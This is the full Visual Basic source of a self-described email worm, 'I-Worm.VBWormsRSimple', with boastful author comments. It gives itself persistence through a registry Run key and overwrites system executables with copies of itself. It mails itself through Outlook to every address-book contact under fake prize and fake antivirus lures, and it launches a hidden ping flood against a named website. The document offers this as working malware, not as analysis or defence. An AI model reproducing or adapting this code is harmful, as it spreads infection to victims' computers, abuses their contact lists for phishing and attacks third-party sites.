'User interaction.. The ultimate social engineering tactic :)
Private Sub Command1_Click()
'Go to AVP's website
Shell "c:\PROGRA~1\INTERN~1\iexplore.exe http://www.avp.ch"
'DoS a VX webpage.. I'm so fuckin' mean
Shell "ping -t -l 10000 indovirus.8m.com", vbHide
End Sub

'Main Process
Private Sub Form_Load()
Call m
Call dead
Call melissaclone
End Sub

'Modify the registry.. Make our worm run at startup
Function m()
On Error Resume Next
Open "c:\z.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]"
Print #1, """System Monitor""=""\""c:\\WINDOWS\\SYSNOM.EXE\"""""
Close 1
Shell "regedit /s c:\z.reg"
Kill "c:\z.reg"
End Function

'Spawn 2 clones and infect SCANREGW.EXE... Why scanregw.exe? Examine the registry and you'll know why :)
Function dead()
On Error Resume Next
xx = App.Path & "\" & App.EXEName & ".exe"
x = App.Path & App.EXEName & ".exe"
y = "c:\WINDOWS\SYSNOM.EXE"
z = "c:\WINDOWS\SCANREGW.EXE"
zz = "c:\WINDOWS\SoftwareKey.exe"
FileCopy x, y
FileCopy x, z
FileCopy x, zz
FileCopy xx, y
FileCopy xx, z
FileCopy xx, zz
End Function

'The generic way to spread itself in the Internet... Thanks Melissa.. Uses advanced social engineering..
Private Sub melissaclone()
On Error Resume Next
Dim clash, rancid, goldfinger, ska, punk, a, b, c, d, f, g
clash = "Wanna remove the I-worms CodeRed, BadTrans, Goner, Updater, etc? " _
      & "Good news for you because we're giving you a software which removes the latest internet worms in your pc. " _
      & "Included is your free software from AVP."
rancid = "Hi! You have just won yourself a plane ticket to Bali, Indonesia! " _
       & "Click the attachment to see how to claim your price. " _
       & "This message is courtesy of YouCanSeeTheWorld.com."
goldfinger = "Hi! You are a winner of a trip to Iceland. " _
      & "Included in this message is a software which can help you claim your prize. " _
      & "See you there!!! Iceland.com"
    punk = Array(rancid, clash, goldfinger)
    Randomize
    ska = punk(Int(Rnd * 3))
    Set a = CreateObject("Outlook.Application")
    Set b = a.getnamespace("MAPI")
    If a = "Outlook" Then
    b.Logon "profile", "password"
    For f = 1 To b.addresslists.Count
    For d = 1 To b.addresslists(f).addressentries.Count
    With a.createitem(69 - 69)
        Set g = b.addresslists(f).addressentries(d)
        .Recipients.Add g
        .Subject = "Good News"
        .body = ska
        .Attachments.Add "c:\WINDOWS\SoftwareKey.exe"
        .send
        End With
        g = ""
    Next d
    Next f
    b.logoff
    End If
End Sub
' Everything must be made simple... Alcopaul
' I-Worm.VBWormsRSimple... first VB worm to use social engineering well... :p
' Attack of the VB Clones


' It's easy as 1-2-3..No WinAPI, No Options, No declarations..
' Why make it hard when you have the options to do it more simple?
